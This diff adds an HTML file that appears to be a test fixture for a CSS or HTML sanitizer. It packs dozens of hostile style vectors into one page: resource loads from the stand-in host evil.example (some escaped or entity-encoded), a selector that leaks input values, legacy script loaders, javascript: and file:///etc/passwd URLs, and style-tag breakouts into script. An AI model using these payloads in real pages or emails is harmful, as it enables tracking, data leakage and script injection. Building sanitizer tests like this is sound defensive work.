@@ -1,0 +1,49 @@
+<html><head><style>
+@charset "utf-8";
+@import url("https://evil.example/import.css");
+@import 'https://evil.example/import2.css';
+@IMPORT url(https://evil.example/import3.css);
+@\69mport url(https://evil.example/import4.css);
+@font-face { font-family: Leak; src: url(https://evil.example/font.woff2) format("woff2"); }
+@namespace url(https://evil.example/ns);
+@media screen { @import url(https://evil.example/nested-import.css); .m { background: url(https://evil.example/media.png) } }
+@supports (display:grid) { .s { list-style-image: url(https://evil.example/list.png) } }
+@document url-prefix(https://evil.example/) { body { color: red } }
+@-moz-document url-prefix() { body { color: red } }
+@keyframes k { from { background: url(https://evil.example/kf.png) } }
+body { background: url(https://evil.example/body.png) }
+.a { background-image: url(  "https://evil.example/a.png"  ) }
+.b { background-image: \75\72\6c(https://evil.example/escaped.png) }
+.c { background: u\rl(https://evil.example/escaped2.png) }
+.d { cursor: url(https://evil.example/cursor.cur), auto }
+.e::before { content: url(https://evil.example/content.png) }
+.f { background: image-set("https://evil.example/set.png" 1x) }
+.g { background: -webkit-image-set(url(https://evil.example/wset.png) 1x) }
+.h { width: expression(alert(1)) }
+.i { behavior: url(https://evil.example/x.htc) }
+.j { -moz-binding: url(https://evil.example/x.xml#xss) }
+.k { position: fixed; top: 0; left: 0; z-index: 2147483647 }
+.l { position: sticky }
+.m2 { background: url(javascript:alert(1)) }
+.n { background: url(data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=) }
+.o { background: url(file:///etc/passwd) }
+.p { background: url(\\attacker\share\x.png) }
+.q { background: url(https://evil.example/unterminated.png }
+input[value^="a"] { background: url(https://evil.example/a) }
+.r { mask-image: url(https://evil.example/mask.svg#m) }
+.s2 { filter: url(https://evil.example/filter.svg#f) }
+.t { --leak: url(https://evil.example/custom.png); background: var(--leak) }
+.u { background: src("https://evil.example/src.png") }
+.v { font-family: "</style><img src=x onerror=alert(1)>" }
+.w { color: red } /* </style><script>alert(2)</script> */
+</style>
+<style>
+.ok { color: #333; font: 14px/1.5 Helvetica, Arial, sans-serif; padding: 0 8px !important }
+@media only screen and (max-width: 600px) { .stack { display: block !important; width: 100% !important } }
+</style></head>
+<body><p class="ok stack a b c d e f g h">styled text</p>
+<p style="background:url(https://evil.example/inline.png); color: blue">inline</p>
+<p style="background:u&#114;l(https://evil.example/entity-inline.png)">entity inline</p>
+<p style="background:&#117;&#114;&#108;(https://evil.example/entity2.png)">entity inline 2</p>
+<p style="x:1;}</style><script>alert(3)</script>">break out</p>
+</body></html>
